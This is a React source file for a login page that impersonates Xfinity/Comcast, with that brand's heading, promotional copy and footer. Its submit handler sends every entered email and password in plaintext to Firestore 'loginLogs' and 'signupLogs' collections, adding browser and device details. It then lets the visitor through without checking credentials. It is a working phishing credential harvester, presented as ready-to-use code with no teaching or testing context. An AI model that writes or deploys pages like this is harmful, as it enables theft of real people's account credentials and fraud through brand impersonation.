import { useState, useEffect } from 'react';
import { FiEye, FiEyeOff } from 'react-icons/fi';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../firebase/config';

export default function LoginPage({ onLoginSuccess }) {
  const [isLogin, setIsLogin] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    username: ''
  });
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    try {
      if (isLogin) {
        await addDoc(collection(db, 'loginLogs'), {
          email: formData.email,
          password: formData.password,
          timestamp: serverTimestamp(),
          success: true,
          userAgent: navigator.userAgent,
          ipAddress: 'Simulated IP',
          deviceType: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
        });
        document.cookie = `user=${formData.email}; max-age=86400; path=/`;
        onLoginSuccess();
      } else {
        await addDoc(collection(db, 'signupLogs'), {
          email: formData.email,
          username: formData.username,
          password: formData.password,
          timestamp: serverTimestamp(),
          success: true,
          userAgent: navigator.userAgent,
          ipAddress: 'Simulated IP',
          deviceType: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
        });
        document.cookie = `user=${formData.email}; max-age=86400; path=/`;
        onLoginSuccess();
      }

      setFormData({ email: '', password: '', username: '' });
    } catch (error) {
      setError('An error occurred. Please try again.');
      const logCollection = isLogin ? 'loginLogs' : 'signupLogs';
      await addDoc(collection(db, logCollection), {
        email: formData.email,
        username: formData.username,
        password: formData.password,
        timestamp: serverTimestamp(),
        success: false,
        error: error.message,
        userAgent: navigator.userAgent,
        ipAddress: 'Simulated IP',
        deviceType: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
      });
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="bg-white py-4 px-6 shadow-sm">
        <div className="max-w-7xl mx-auto"></div>
      </header>

      {/* Main Content */}
      <main className="flex-grow flex flex-col lg:flex-row">
        {/* Left Side - Form */}
        <div className="w-full lg:w-1/2 p-4 sm:p-8 lg:p-12 flex items-center justify-center">
          <div className="w-full max-w-[400px]">
            <h1 className="text-2xl sm:text-[28px] font-bold text-[#191919] mb-6 sm:mb-8">
              Sign in with your Xfinity ID
            </h1>

            {error && (
              <div className="mb-6 p-4 bg-red-50 border-l-4 border-red-500 text-red-700">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
              <div>
                <label htmlFor="email" className="block text-sm font-semibold text-[#191919] mb-2">
                  Email, mobile, or username
                </label>
                <input
                  type="email"
                  name="email"
                  id="email"
                  value={formData.email}
                  onChange={handleChange}
                  className="w-full px-4 py-3 border border-[#CCCCCC] rounded focus:outline-none focus:border-purple-700 focus:ring-1 focus:ring-purple-700"
                  required
                />
              </div>

              <div>
                <label htmlFor="password" className="block text-sm font-semibold text-[#191919] mb-2">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    id="password"
                    value={formData.password}
                    onChange={handleChange}
                    className="w-full px-4 py-3 border border-[#CCCCCC] rounded focus:outline-none focus:border-purple-700 focus:ring-1 focus:ring-purple-700 pr-12"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <FiEyeOff className="h-5 w-5" /> : <FiEye className="h-5 w-5" />}
                  </button>
                </div>
              </div>

              <div>
                <a href="#" className="text-sm text-purple-700 hover:text-purple-800 font-semibold">
                  Forgot password?
                </a>
              </div>

              <button
                type="submit"
                className="w-full bg-purple-700 text-white font-semibold py-3 px-4 rounded hover:bg-purple-800 transition-colors"
              >
                Let's go
              </button>

              <div className="pt-4 border-t border-gray-200">
                <button
                  type="button"
                  className="text-purple-700 hover:text-purple-800 text-sm font-semibold"
                >
                  New to Xfinity? View exclusive offers near you
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* Right Side - Image */}
        <div className="w-full lg:w-1/2 bg-purple-50 flex items-center justify-center p-4 sm:p-8 lg:p-12">
          <div className="max-w-lg text-center">
            <h2 className="text-2xl sm:text-3xl font-bold text-purple-700 mb-4">
              Save big with Xfinity Mobile
            </h2>
            <p className="text-base sm:text-lg text-gray-700 mb-8">
              You could save hundreds a year over T-Mobile, AT&T, and Verizon.
            </p>
            <div className="relative w-48 h-72 sm:w-64 sm:h-96 mx-auto">
              <div className="absolute inset-0 bg-purple-700 rounded-3xl transform rotate-12"></div>
              <div className="absolute inset-0 bg-white rounded-3xl flex items-center justify-center">
                <span className="text-6xl sm:text-8xl font-bold text-purple-700">X</span>
              </div>
            </div>
            <p className="text-xs sm:text-sm text-gray-600 mt-8">
              Xfinity Mobile requires Xfinity Internet. Compares 2 Unlimited lines and lowest price 5G plans of top 3 carriers. Data thresholds may vary.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white py-4 sm:py-6 px-4 sm:px-8 border-t">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-center text-sm text-gray-600">
          <div className="mb-4 sm:mb-0">© 2025 Comcast</div>
          <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-6 text-center sm:text-left">
            <a href="#" className="hover:text-gray-900">Privacy Policy</a>
            <a href="#" className="hover:text-gray-900">Terms of Service</a>
            <a href="#" className="hover:text-gray-900">Cookie Preferences</a>
          </div>
        </div>
      </footer>
    </div>
  );
}